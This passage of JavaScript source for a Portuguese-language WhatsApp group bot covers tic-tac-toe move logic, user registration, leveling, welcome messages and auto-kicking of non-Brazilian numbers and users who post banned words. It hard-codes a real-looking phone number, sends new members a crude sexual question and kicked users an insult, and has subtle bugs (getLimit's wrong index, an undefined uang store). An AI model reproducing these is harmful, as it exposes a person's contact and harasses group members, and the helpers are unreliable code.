    	            esp.c2 = "⭕"
    	        }
    	    break
			case 8:
				if (esp.c3 == "🔲") {
        	        tttset.reActivate1 = "off"
        	        esp.c3 = "⭕"
        	    }
        	break
		}
	}
}

const IAmove1 = () => {
	//JOGADA PARA VITÓRIA
	if (esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") {
		esp.a2 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") {
		esp.a3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") {
		esp.a1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") {
		esp.a3 = "⭕"
	//JOGADA PARA BLOQUEIO
	} else if (esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") {
		esp.b3 = "⭕"
	} else if (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") {
		esp.b1 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") {
		esp.c2 = "⭕"
	} else if (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") {
		esp.b1 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") {
		esp.c2 = "⭕"
	} else if (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") {
		esp.a2 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") {
		esp.b3 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") {
		esp.a3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") {
		esp.c3 = "⭕"
	} else if (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") {
		esp.a1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") {
		esp.c1 = "⭕"
	} else if (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") {
		esp.b2 = "⭕"
	} else if (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌") {
		esp.a3 = "⭕"
	}
}

//MOVIMENTO ALTERNATIVO
const IAalter = () => {
	let randomALTER = Math.floor(Math.random() * 9)
	switch (randomALTER) {
		case 0:
			if (esp.a1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a1 = "⭕"
            }
        break
		case 1:
			if (esp.a2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a2 = "⭕"
            }
        break
		case 2:
			if (esp.a3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.a3 = "⭕"
            }
        break
		case 3:
			if (esp.b1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b1 = "⭕"
            }
        break
		case 4:
			if (esp.b2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b2 = "⭕"
            }
        break
		case 5:
			if (esp.b3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.b3 = "⭕"
            }
        break
		case 6:
			if (esp.c1 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c1 = "⭕"
            }
        break
		case 7:
			if (esp.c2 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c2 = "⭕"
            }
        break
		case 8:
			if (esp.c3 == "🔲") {
                tttset.reActivate2 = "off"
                esp.c3 = "⭕"
            }
        break
	}
}

//JOGAR NOS CANTOS E CENTRO - IMPOSSIVEL
const priorityC = () => {
	let randomPriC = Math.floor(Math.random() * 5)
	switch (randomPriC) {
		case 0 :
			if (esp.a1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a1 = "⭕"
			}
		break
		case 1 :
			if (esp.a3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.a3 = "⭕"
			}
		break
		case 2 :
			if (esp.b2 == "🔲") {
				tttset.reActivate3 = "off"
				esp.b2 = "⭕"
			}
		break
		case 3 :
			if (esp.c1 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c1 = "⭕"
			}
		break
		case 4 :
			if (esp.c3 == "🔲") {
				tttset.reActivate3 = "off"
				esp.c3 = "⭕"
			}
		break
	}
}



//--modulos Npm

const fs = require('fs');

const moment = require('moment-timezone');

const {exec} = require('child_process');

const kagApi = require('@kagchi/kag-api');

const fetch = require('node-fetch');

const ffmpeg = require('fluent-ffmpeg');

const {removeBackgroundFromImageFile} = require('remove.bg');

const imgbb = require('imgbb-uploader');

const lolis = require('lolis.life');

const loli = new lolis();

const speed = require('performance-now');

const cd = 4.32e+7 ;

const crypto = require('crypto');

const qrcode = require("qrcode-terminal");

const axios = require('axios');

//--File json bot

const up = JSON.parse(fs.readFileSync('./data/settings.json'));

const samih = JSON.parse(fs.readFileSync('./data/simi.json'))

//--File json user


const _registered = JSON.parse(fs.readFileSync('./datauser/registered.json'));

//--File json data

const trut = JSON.parse(fs.readFileSync('./data/truth.json'));

const user = JSON.parse(fs.readFileSync('./database/json/user.json'));

const _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'));

const _level = JSON.parse(fs.readFileSync('./database/user/level.json'));

const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'));

const badword = JSON.parse(fs.readFileSync('./database/json/badword.json'));

const { BarBarApi, ZeksApi, TechApi, TobzApi, VthearApi } = JSON.parse(fs.readFileSync('./database/json/apikey.json'))

const antilink = JSON.parse(fs.readFileSync('./database/json/antilink.json'));

const antiracismo = JSON.parse(fs.readFileSync('./database/json/antiracismo.json'));

const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'));

const bad = JSON.parse(fs.readFileSync('./database/json/bad.json'));

const fak = JSON.parse(fs.readFileSync('./data/dare.json'));

const dare = JSON.parse(fs.readFileSync('./data/fakta.json'));


//--configurações

prefix = up.prefix

ban = []

const memberlimit = up.memberlimit;

const cr = up.cr;

const NamaBot = up.NamaBot;

const Ig = up.Ig;

const Wa1 = up.Wa1;

const Wa2 = up.Wa2;

const Ovo = up.Ovo;

const Pulsa = up.Pulsa;

const Dana = up.Dana;

const blocked = [];

const ownerNumber = up.ownerNumber;

//--Apikey

BarBarKey = up.BarBarKey;

vKey = up.Vhtearkey;

viKey = up.Vinzapi

meKey = up.Itsmeikyapi

lolKey = up.LolHumanKey


//--vcard

const vcard = 'BEGIN:VCARD\n'

+ 'VERSION:3.0\n'

+ 'FN: bot do 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™\n' // Nome do bot

+ 'ORG:bot do 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™;\n' // Nome do bot

+ 'TEL;type=CELL;type=VOICE;waid=557187566648:+55 71 8756-6648\n' // Nome do bot

+ 'END:VCARD' 

//-- registro

const getRegisteredRandomId = () => {

  return _registered[Math.floor(Math.random() * _registered.length)].id

}



const addRegisteredUser = (userid, sender, age, time, serials) => {

  const obj = {

id: userid,

name: sender,

age: age,

time: time,

serial: serials

  }

  _registered.push(obj)

  fs.writeFileSync('./datauser/registered.json', JSON.stringify(_registered))

}



const createSerial = (size) => {

  return crypto.randomBytes(size).toString('hex').slice(0, size)

}



const checkRegisteredUser = (sender) => {

  let status = false

  Object.keys(_registered).forEach((i) => {

if (_registered[i].id === sender) {

  status = true

}

  })

  return status

}

const addATM = (sender) => {

  const obj = {

id: sender, uang: 0

  }

  uang.push(obj)

  fs.writeFileSync('./datauser/uang.json',

JSON.stringify(uang))

}



const addKoinUser = (sender, amount) => {

  let position = false

  Object.keys(uang).forEach((i) => {

if (uang[i].id === sender) {

  position = i

}

  })

  if (position !== false) {

uang[position].uang += amount

fs.writeFileSync('./datauser/uang.json', JSON.stringify(uang))

  }

}



const checkATMuser = (sender) => {

  let position = false

  Object.keys(uang).forEach((i) => {

if (uang[i].id === sender) {

  position = i

}

  })

  if (position !== false) {

return uang[position].uang

  }

}

const confirmATM = (sender, amount) => {

  let position = false

  Object.keys(uang).forEach((i) => {

if (uang[i].id === sender) {

  position = i

}

  })

  if (position !== false) {

uang[position].uang -= amount

fs.writeFileSync('./datauser/uang.json', JSON.stringify(uang))

  }

}
//-- leveling
const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }        

        const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
        
                const getLimit = (sender) => {
                let position = false
              Object.keys(limit).forEach ((i) => {
                if (limit[position].id === sender) {
                   position = i
                  }
              })
             if (position !== false) {
                return limit[position].limit
            }
        }
        
                const bayarLimit = (sender, amount) => {
                let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }
        
                const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }





//--Waktu

function kyun(seconds){

  function pad(s){

    return (s < 10 ? '0' : '') + s;

  }

  var hours = Math.floor(seconds / (60*60));

  var minutes = Math.floor(seconds % (60*60) / 60);

  var second = Math.floor(seconds % 60);

  return `${pad(hours)}:${pad(minutes)}:${pad(second)}`;

}


//--Whatsapp start conneção

async function starts() {
	const Pin = new WAConnection()
	Pin.logger.level = 'warn'
	console.log(banner.string)
	Pin.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code above'))
	})

	fs.existsSync('./BarBar.json') && Pin.loadAuthInfo('./BarBar.json')
	Pin.on('connecting', () => {
		start('2', 'Tenha calma, o junhin tá conectado...')
	})
	Pin.on('open', () => {
		success('2', 'Conectado ao Junhin!')
	})
	await Pin.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./BarBar.json', JSON.stringify(Pin.base64EncodedAuthInfo(), null, '\t'))


	Pin.on('group-participants-update', async (anu) => {
		const mdata = await Pin.groupMetadata(anu.jid)
		if(antifake.includes(anu.jid)) {
			if (anu.action == 'add'){
				num = anu.participants[0]
				if(!num.split('@')[0].startsWith(55)) {
					Pin.sendMessage(mdata.id, 'Corra numero fake safado seu ban esta próximo', MessageType.text)
					setTimeout(async function () {
						Pin.groupRemove(mdata.id, [num])
					}, 1000)
				}
			}
		}
		if (!welkom.includes(anu.jid)) return
		try {
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await Pin.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `entrou mais umkkk\nᴏʟᴀ @${num.split('@')[0]}👋\nʙᴇᴍ ᴠɪɴᴅᴏ ᴀ ᴇsᴛᴇ ɢʀᴜᴘᴏ, ᴍᴇɴᴏs golpistas, ғᴀᴋᴇs ᴇ ᴢᴇ ᴛʀᴀᴠɪɴʜᴀs *${mdata.subject}*\n\n ────────────────
┏━━━━━━━━━━━━━━━
┃────「 *_ᴀᴘʀᴇsᴇɴᴛᴀÇÃᴏ_* 」─────
┃━━━━━━━━━━━━━━━
┠⊷️ *ɴᴏᴍᴇ* : @${num.split('@')[0]}\n
┠⊷️ *ɪᴅᴀᴅᴇ* : coe sla conta pra noix 
┠⊷️ *ɢᴇɴᴇʀᴏ* : hmmm 
┠⊷️ *É ᴠɪʀɢᴇᴍ ᴅᴀ ʙᴜɴᴅᴀ?* : 😬
┗━━━━━━━━━━━━━━━

ᴅɪɢɪᴛᴇ *${prefix}daftar* ᴘᴀʀᴀ ᴄᴏᴍᴇᴄᴀʀ ᴀ ᴜsᴀʀ  ʙᴏᴛ`
				let buff = await getBuffer(ppimg)
				Pin.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				} else if (anu.action == 'promote') {
				num = anu.participants[0]
				try {
					ppimg = await Pin.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `*_「 ᴘʀᴏᴍᴏÇÃᴏ ᴅᴇᴛᴇᴄᴛᴀᴅᴀ 」_*\n@${num.split('@')[0]} ᴏ ᴀᴅɪᴄᴀᴏ ᴅᴏ ᴀᴅᴍɪɴ ᴇsᴛᴀ ᴘʀᴏɴᴛᴏ?, ʟɪᴄᴇɴᴄɪᴀᴅᴏ ᴘᴇʟᴏ ᴅᴏɴᴏ ᴅᴏ ɢʀᴜᴘᴏ!`
				let buff = await getBuffer(ppimg)
				Pin.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
				} else if (anu.action == 'demote') {
				num = anu.participants[0]
				try {
					ppimg = await Pin.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `*_「 ᴅᴇᴍᴏᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 」_*\n@${num.split('@')[0]} ᴏ ᴀᴅɪᴄᴀᴏ ᴅᴏ ᴀᴅᴍɪɴ ᴇsᴛᴀ ᴘʀᴏɴᴛᴏ?,ʟɪᴄᴇɴᴄɪᴀᴅᴏ ᴘᴇʟᴏ ᴅᴏɴᴏ ᴅᴏ ɢʀᴜᴘᴏ!`
				let buff = await getBuffer(ppimg)
				Pin.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await Pin.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `ᴀᴅᴇᴜs @${num.split('@')[0]}👋\nsᴇ ᴠᴏᴄᴇ sᴀɪᴜ ᴘᴏʀ ᴀʟɢᴜᴍ ɪɴᴄᴏᴠᴇɴɪᴇɴᴛᴇ ᴅᴇsᴄᴜʟᴘᴇ, ᴍᴀs sᴇ ᴄᴀᴜsᴏᴜ ᴀʟɢᴜᴍ ᴘʀᴏʙʟᴇᴍᴀ ᴏᴜ ғᴏʀ ɴᴏᴛᴀs ғᴀᴋᴇs ɴᴀᴏ ᴘʀᴇᴄɪsᴀ ᴠᴏʟᴛᴀʀ`
				let buff = await getBuffer(ppimg)
				Pin.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
				} catch (e) {	     
			console.log('Error : %s', color(e, 'yellow'))
		}
	})

		Pin.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	Pin.on('chat-update', async (mek) => {
		try {
			if (!mek.hasNewMessage) return 
			mek = JSON.parse(JSON.stringify(mek)).messages[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const DnsBot = ["0@s.whatsapp.net"] // ubah aja gapapa
			const farhan = mek.message.conversation			
			const insom = from.endsWith('@g.us')
			const nameReq = insom ? mek.participant : mek.key.remoteJid
			pushname2 = Pin.contacts[nameReq] != undefined ? Pin.contacts[nameReq].vname || Pin.contacts[nameReq].notify : undefined


			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			
            const date = new Date().toLocaleDateString()
            
			const time = moment.tz('America/Los_Angeles').format('DD/MM HH:mm:ss')

			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (mek.message.listResponseMessage && mek.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) && mek.message.listResponseMessage.singleSelectReply.selectedRowId) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			
            var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
            
		    var tas = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		    
		    var Link = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		
				const messagesLink = Link.slice(0).trim().split(/ +/).shift().toLowerCase() 
	       
	         const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
	        
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()

			const args = body.trim().split(/ +/).slice(1) 
			const mesejAnti = tas.slice(0).trim().split(/ +/).shift().toLowerCase()
			  
			const isCmd = body.startsWith(prefix)

      const is = budy.slice(0).trim().split(/ +/).shift().toLowerCase()

			mess = {

  wait: '*ESTOU PROCESSANDO...SE DER ERRO TENTE NOVAMENTE⏳ 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ domina*',

  success: 'Sucesso',

  Public: '*❌* recursos em modo privado agora apenas o proprietário pode usar o bot',

  ferr: '❌ Parece que o recurso está errado ❌',

 
  levelon: `\`\`\`✓Ativado com sucesso o modo leveling no grupo\`\`\` `,
 
  leveloff: `\`\`\`✓Desativado com sucesso o modo leveling no grupo\`\`\` `,
  
  levelnoton: ' 🚫 *modo leveling não foi ativado*',
    
  levelnol: '*error* 0 °-°',

  error: {

  stick: 'PRONTINHO🙈',

  Iv: '*❌* Erro de link'

  },

  only: {

    group: '*❌* Este comando e so pra grupo*',
    
   
    
    ownerG: '*❌* Este recurso é para criador do GRUPO',

    ownerB: '*❌* Este recurso é somente para o junhin︎',
    
    benned: '*tomou ban, troxa*',
    
	userB: `𝙾𝙻𝙰 𝙹𝙾𝚅𝙴𝙼 *${pushname2}*, 𝚅𝙾𝙲𝙴 𝙽𝙰𝙾 𝙴𝚂𝚃𝙰 𝚁𝙴𝙶𝙸𝚂𝚃𝚁𝙰𝙳𝙾 𝙽𝙾 𝙱𝙰𝙽𝙲𝙾 𝙳𝙴 𝙳𝙰𝙳𝙾𝚂, 𝙳𝙸𝙶𝙸𝚃𝙴 \n*${prefix}daftar*`,
	
    admin: '*❌* Este recurso é para ADMIN GRUPO',

    Badmin: '*❌* Torne-o alpino ADMIN !',

  
      daftarB: `𝘖𝘭𝘢 *${pushname2}* 𝗦𝗘 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗘! 𝘥𝘪𝘨𝘪𝘵𝘦 *${prefix}daftar* 𝘗𝘈𝘙𝘈 𝘝𝘊 𝘊𝘖𝘔𝘌𝘊𝘈𝘙 𝘜𝘚𝘈𝘙 𝘖 𝘉𝘖𝘛 ⚠️`

  }

}
//-- constançias
      const totalchat = await Pin.chats.all()

			const botNumber = Pin.user.jid

			const ownerNumber = [`${up.ownerNumber}@s.whatsapp.net`] // troque aqui seu numero é se torne o dono
            
			const isGroup = from.endsWith('@g.us')

			const sender = isGroup ? mek.participant : mek.key.remoteJid

			const groupMetadata = isGroup ? await Pin.groupMetadata(from) : ''

			const groupName = isGroup ? groupMetadata.subject : ''

			const groupId = isGroup ? groupMetadata.jid : ''

			const groupMembers = isGroup ? groupMetadata.participants : ''

			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
				
            const isAntiFake = isGroup ? antifake.includes(from) : false
            
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

			const isGroupAdmins = groupAdmins.includes(sender) || false
			
            const isBadWord = isGroup ? badword.includes(from) : false
            
            const isAntiRacismo = isGroup ? antiracismo.includes(from) : false
            
            const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
           
            const isAntiLink = isGroup ? antilink.includes(from) : false
         
			const isWelkom = isGroup ? welkom.includes(from) : false

			const isOwner = ownerNumber.includes(sender)
			
			const isSimi = isGroup ? samih.includes(from) : false
			
		    const isUser = user.includes(sender)
		    
			const isBanned = ban.includes(sender)

      const isRegister = checkRegisteredUser(sender)


      const q = args.join(' ')

      const tescuk = ["0@s.whatsapp.net"]

			let pushname = Pin.contacts[sender] != undefined ? Pin.contacts[sender].vname || Pin.contacts[sender].notify: undefined

			const isUrl = (url) => {

			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))

			}
			
//--Balasan bot

			const reply = (teks) => {

				Pin.sendMessage(from, teks, text, {quoted:mek})

			}

			const sendMess = (hehe, teks) => {

				Pin.sendMessage(hehe, teks, text)

			}

			const mentions = (teks, memberr, id) => {

				(id == null || id == undefined || id == false) ? Pin.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : Pin.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})

			}
            if (isGroup && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 10000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await reply(`*「 LEVEL UP 」*\n\nঔৣ͜͡➳ *Nome*: ${pushname2}\nঔৣ͜͡➳ *XP*: ${getLevelingXp(sender)}\nঔৣ͜͡➳ *Level*: ${getLevel} -> ${getLevelingLevel(sender)}\n\nParabéns!!  🎊🎉`)
                }
            } catch (err) {
                console.error(err)
            }
        }
			const costum = (pesan, tipe, target, target2) => {

      Pin.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {

  remoteJid: from

}: {})

  }, message: {

conversation: `${target2}`

  }}})

}

const sendPtt = (teks) => {

  Pin.sendMessage(from, audio, mp3, {

quoted: mek

  })

}
			
//--antipalavrao      
        if (bad.includes(messagesLink)){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return reply(`*${pushname2}* vc é adm não fale essas coisas`)
		Pin.updatePresence(from, Presence.composing)
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		setTimeout( () => {
		reply(`*𝑒𝑙𝑖𝑚𝑖𝑛𝑎𝑑𝑜 𝑑𝑜 𝑔𝑟𝑢𝑝𝑜*`)
		}, 100)
		setTimeout( () => {
			Pin.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
					}, 10)
		setTimeout( () => {
		reply(`*_「 𝑃𝑎𝑙𝑎𝑣𝑟𝑎 𝑜𝑓𝑒𝑛𝑠𝑖𝑣𝑎 𝐷𝑒𝑡𝑒𝑐𝑡𝑎𝑑𝑎」_*\n𝐷𝑒𝑠𝑐𝑢𝑙𝑝𝑒 *${pushname2}* vc foi expulso do grupo *${groupMetadata.subject}*`)
		}, 0)
		}
//-- constançias
		
        if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'do menor', color(sender.split('@')[0]), 'args :', color(args.length))
	    if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'do menor', color(sender.split('@')[0]), 'args :', color(args.length))
			
